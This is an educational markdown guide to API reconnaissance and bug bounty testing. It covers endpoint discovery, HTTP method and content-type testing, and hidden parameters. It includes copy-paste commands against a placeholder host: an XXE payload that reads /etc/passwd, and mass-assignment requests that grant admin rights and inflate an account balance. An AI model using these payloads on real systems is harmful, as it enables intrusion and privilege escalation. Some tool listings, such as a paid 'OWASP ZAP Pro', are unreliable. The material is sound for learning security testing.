# API Testing & Reconnaissance 
---

## Table of Contents
1. [API Fundamentals](#api-fundamentals)
2. [API Reconnaissance](#api-reconnaissance)
3. [Endpoint Discovery](#endpoint-discovery)
4. [HTTP Methods & Content Types](#http-methods--content-types)
5. [Hidden Parameters & Mass Assignment](#hidden-parameters--mass-assignment)
6. [Tools & Alternatives](#tools--alternatives)
7. [Real-World Testing Workflow](#real-world-testing-workflow)

---

## API Fundamentals

### What is an API?

An **API (Application Programming Interface)** is a contract between client and server. Think of it like a **restaurant menu**:
- **Menu** = API Documentation (what's available)
- **Dishes** = Endpoints (specific requests)
- **Ingredients** = Parameters (input data)
- **Server** = Kitchen (processes your request)
- **Your plate** = Response (what you get back)

### Why Test APIs?

APIs are everywhere and often **less protected than web interfaces** because developers assume only "approved" clients will interact with them. This is where hackers thrive. 🎯

---

## API Reconnaissance

### The Three Pillars of API Recon

| Phase | Goal | What You'll Find |
|-------|------|------------------|
| **Discovery** | Find the API | Endpoints, documentation, versions |
| **Mapping** | Understand it | HTTP methods, parameters, auth |
| **Analysis** | Identify weaknesses | Misconfigurations, logic flaws |

### Step 1: Identify Endpoints

**Endpoint** = A specific URL path where the API accepts requests

**Example:**
```http
GET /api/books HTTP/1.1
Host: example.com
```

- `GET` = HTTP method
- `/api/books` = Endpoint
- `example.com` = Host

**Analogy:** If the API is a library, endpoints are the checkout desk, reference section, and admin office—each handles different requests.

---

## Endpoint Discovery

### Method 1: Look for Documentation Endpoints

Most APIs expose documentation at predictable paths:

```
/api
/api/docs
/api/documentation
/swagger/index.html
/openapi.json
/v1/api-docs
/.well-known/openapi.json
/graphql
/graphiql
```

**Try This First (takes 30 seconds):**
```bash
# Quick curl check
curl -s https://target.com/swagger/index.html | head -20
curl -s https://target.com/openapi.json | jq .
```

### Method 2: Machine-Readable Documentation

APIs often publish metadata in **JSON** or **XML** format for automation.

**Why this matters:** If you find the schema, you've got a roadmap of everything the API does.

**Common Tools:**

| Tool | Type | Cost | Best For |
|------|------|------|----------|
| **Burp Suite Scanner + Crawler** | Paid | $400-2400/yr | Enterprise-grade scanning |
| **Postman** | Free/Paid | Free tier generous | API testing & documentation |
| **OpenAPI Parser (BApp)** | Free | Burp Suite extension | Parsing OpenAPI specs |
| **curl + jq** | Free | CLI | Quick manual testing |

**Free Alternative Workflow:**
```bash
# 1. Extract OpenAPI spec
curl -s https://api.target.com/openapi.json > api-spec.json

# 2. Parse with jq
jq '.paths | keys' api-spec.json

# 3. Test endpoints with curl
curl -X GET https://api.target.com/api/users -H "Authorization: Bearer TOKEN"
```

### Method 3: JavaScript File Analysis

Developers often hardcode API endpoints in frontend code—this is GOLD.

**Find Endpoints in JS:**

```bash
# 1. Download and search JS files
curl -s https://target.com/assets/app.js | grep -o "'/api/[^']*'" | sort -u

# 2. Use regex for various patterns
curl -s https://target.com/assets/app.js | grep -oE '(https?://)?/[a-zA-Z0-9/_-]+' | sort -u
```

**Free Tools:**
- **JSFinder** (free GitHub tool) - extracts URLs from JS
- **LinkFinder** - finds endpoints in JS
- **Burp Suite JS Link Finder BApp** (free with Community Edition)

**Quick command-line alternative:**
```bash
# Using getJS from tomnomnom
echo "target.com" | getJS | sort -u
```

---

## HTTP Methods & Content Types

### Why All Methods Matter

Think of HTTP methods like **keys on a keyboard**:
- **GET** = Read a file
- **POST** = Create a file
- **PUT/PATCH** = Edit a file
- **DELETE** = Remove a file
- **HEAD** = Check if file exists (without downloading)
- **OPTIONS** = Ask "what can I do here?"

**Critical:** An endpoint may be protected for GET but unprotected for POST or PUT!

### Testing All HTTP Methods

**Manual Testing:**
```bash
# Test each method on an endpoint
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  echo "=== $method /api/users/123 ==="
  curl -X $method https://target.com/api/users/123 -v
done
```

**Using Burp Suite Intruder (Free Community Edition):**
1. Send request to Intruder
2. Set payload position: `GET` in the HTTP method
3. Use built-in "HTTP verbs" payload list
4. Launch attack

**Result:** You'll see which methods the API accepts. Often the "wrong" methods reveal vulnerabilities.

---

## Identifying Supported Content Types

### The Content-Type Confusion Attack

APIs process data based on the `Content-Type` header. Different formats = different behaviors.

**Analogy:** Same restaurant, different languages. In French they serve you poached eggs, in English they fry them. Changing the language changes the dish.

### Common Content Types

```
application/json          → { "key": "value" }
application/xml           → <key>value</key>
application/x-www-form-urlencoded → key=value&key2=value2
text/plain                → raw text
multipart/form-data       → file uploads
```

### Why This Matters for Security

- **JSON** → Usually has strong parsing
- **XML** → Vulnerable to XXE (XML External Entity attacks)
- **Form data** → May bypass filters designed for JSON

### Test Content-Type Switching

**Example: Finding an XXE vulnerability**

```bash
# Original request (JSON - secure)
curl -X POST https://target.com/api/upload \
  -H "Content-Type: application/json" \
  -d '{"file": "test"}'

# Same endpoint with XML (vulnerable!)
curl -X POST https://target.com/api/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <file>&xxe;</file>'
```

**Free Tools for Content Type Conversion:**
- **curl** - supports all formats natively
- **Burp Suite Community** - has manual content converter
- **Postman** - automatically converts between formats

---

## Hidden Parameters & Mass Assignment

### The Mass Assignment Vulnerability

**What is it?**
Developers often use frameworks that automatically bind request parameters to object fields. Sometimes they bind MORE fields than they intended.

**Analogy:** 
Imagine a form with visible fields (username, email) but the backend object has hidden fields (isAdmin, isBanned). If the framework auto-binds all fields, you can modify hidden ones.

### How to Find Hidden Parameters

**Step 1: Examine API Responses**

```bash
# Make a GET request to see what fields exist
curl https://target.com/api/users/123
```

**Response:**
```json
{
  "id": 123,
  "name": "John Doe",
  "email": "john@example.com",
  "isAdmin": false,
  "isVerified": false,
  "accountBalance": 0
}
```

**Analysis:**
- Visible parameters in UPDATE request: `name`, `email`
- Hidden parameters from GET response: `id`, `isAdmin`, `isVerified`, `accountBalance`

**Step 2: Test Mass Assignment**

The attacker now tries to modify the hidden parameters:

```bash
# Original update request
curl -X PATCH https://target.com/api/users/123 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John",
    "email": "john@example.com"
  }'

# Exploit attempt - add hidden parameters
curl -X PATCH https://target.com/api/users/123 \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John",
    "email": "john@example.com",
    "isAdmin": true,
    "accountBalance": 999999
  }'
```

### The Testing Method (Hacker's Approach)

**Phase 1: Confirm the Parameter Exists**
```bash
curl -X PATCH https://target.com/api/users/123 \
  -d '{"isAdmin": "invalidValue"}'
```
If response changes or shows error mentioning `isAdmin` → parameter is processed!

**Phase 2: Try Valid Values**
```bash
curl -X PATCH https://target.com/api/users/123 \
  -d '{"isAdmin": true}'
```

**Phase 3: Verify Exploitation**
```bash
# Login as the user and check if you have admin access
curl https://target.com/api/admin -H "Authorization: Bearer YOUR_TOKEN"
```

---

## Tools & Alternatives

### Tier 1: Free (Community Edition)

| Tool | Purpose | Install |
|------|---------|---------|
| **Burp Suite Community** | API scanning, proxy, repeater | [Download](https://portswigger.net/burp/communitydownload) |
| **Postman** | API testing, documentation | `brew install postman` |
| **curl** | Command-line requests | Built-in on Linux/Mac |
| **curl-impersonate** | Bypass advanced bot detection | `pip install curl_impersonate` |
| **HTTPie** | User-friendly curl | `brew install httpie` |
| **Arjun** | Find hidden parameters | `pip install arjun` |
| **ParamSpider** | Discover parameters from URLs | `git clone https://github.com/devanshbatham/ParamSpider` |

### Tier 2: Paid (Industry Standard)

| Tool | Cost | Why |
|------|------|-----|
| **Burp Suite Professional** | $400-2400/yr | Advanced scanning, intruder, advanced target analysis |
| **OWASP ZAP Pro** | Free/Donation | Open-source alternative to Burp |
| **Insomnia** | Free/Paid | Modern Postman alternative |
| **SoapUI** | Free/Paid | Great for SOAP APIs |

### Free Parameter Discovery Tools

**Arjun (Best Free Tool)**
```bash
# Install
pip install arjun

# Find hidden parameters
arjun -u https://target.com/api/search --get
```

**ParamSpider**
```bash
# Extract parameters from historical data (Wayback Machine)
python3 paramspider.py -d target.com -p wayback
```

**Burp Content Discovery**
- Community Edition included
- Uses wordlists to brute-force endpoints
- Takes ~2-5 minutes per scope

---

## Real-World Testing Workflow

### The Complete Hacker's Workflow

```
┌─────────────────────────────────────────────────┐
│ 1. RECONNAISSANCE (Passive)                      │
│ ├─ Find API documentation (/swagger, /api-docs) │
│ ├─ Scrape JavaScript files for endpoints        │
│ └─ Check Wayback Machine for historical APIs    │
└─────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────┐
│ 2. ENDPOINT MAPPING (Active)                     │
│ ├─ Test all discovered endpoints                │
│ ├─ Identify HTTP methods (GET, POST, etc)       │
│ └─ Map required vs optional parameters          │
└─────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────┐
│ 3. PARAMETER DISCOVERY                           │
│ ├─ Run Arjun for hidden parameters              │
│ ├─ Test different Content-Types                 │
│ └─ Examine all API responses for fields         │
└─────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────┐
│ 4. VULNERABILITY TESTING                         │
│ ├─ Test mass assignment (modify hidden params)  │
│ ├─ Test authentication/authorization            │
│ ├─ Test injection flaws (SQL, NoSQL, XXE)       │
│ └─ Test information disclosure                  │
└─────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────┐
│ 5. EXPLOITATION & DOCUMENTATION                  │
│ ├─ Confirm vulnerability with PoC               │
│ ├─ Write detailed report with impact            │
│ └─ Provide remediation advice                   │
└─────────────────────────────────────────────────┘
```

### Quick-Start Commands (Copy-Paste Ready)

**Find API endpoints:**
```bash
# 1. Check common documentation paths
for path in /api /swagger/index.html /openapi.json /v1/api-docs /api/docs; do
  curl -s "https://target.com$path" -I | grep -E "200|301|302"
done

# 2. Extract from JavaScript
curl -s "https://target.com/assets/app.js" | grep -oE '/api/[a-zA-Z0-9/_-]+' | sort -u

# 3. Use curl to test an endpoint
curl -X GET "https://target.com/api/users" -v
```

**Test all HTTP methods:**
```bash
endpoint="https://target.com/api/users"
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  echo "Testing $method..."
  curl -X "$method" "$endpoint" -v -w "\nStatus: %{http_code}\n" 2>/dev/null
done
```

**Find hidden parameters with Arjun:**
```bash
# Install if needed
pip install arjun

# Scan endpoint
arjun -u "https://target.com/api/users/123" --get
arjun -u "https://target.com/api/users" --post
```

**Test mass assignment vulnerability:**
```bash
# Check what fields exist
curl "https://target.com/api/users/123" | jq '.'

# Try to modify "isAdmin"
curl -X PATCH "https://target.com/api/users/123" \
  -H "Content-Type: application/json" \
  -d '{"isAdmin": true}'

# Verify if it worked
curl "https://target.com/api/users/123" | jq '.isAdmin'
```

---

## Key Takeaways for Bug Bounty Success

| Concept | Why It's Important | Example |
|---------|-------------------|---------|
| **Endpoint Discovery** | You can't hack what you don't know exists | Finding `/admin` endpoint forgotten by devs |
| **HTTP Method Testing** | Different methods = different protections | POST allowed when GET is blocked |
| **Content-Type Switching** | Same endpoint behaves differently per format | JSON secure, but XML vulnerable to XXE |
| **Hidden Parameters** | Frameworks auto-bind more than intended | Adding `isAdmin=true` to user update |
| **Response Analysis** | Responses reveal what's in the object | GET response shows all fields, even if UPDATE hides them |

---

## Resources for Further Learning

- **PortSwigger Web Security Academy** - Free API testing course
- **HackerOne** - Real bug bounty targets
- **PentesterLab** - Hands-on API hacking exercises
- **OWASP API Top 10** - Must-read for API security

---
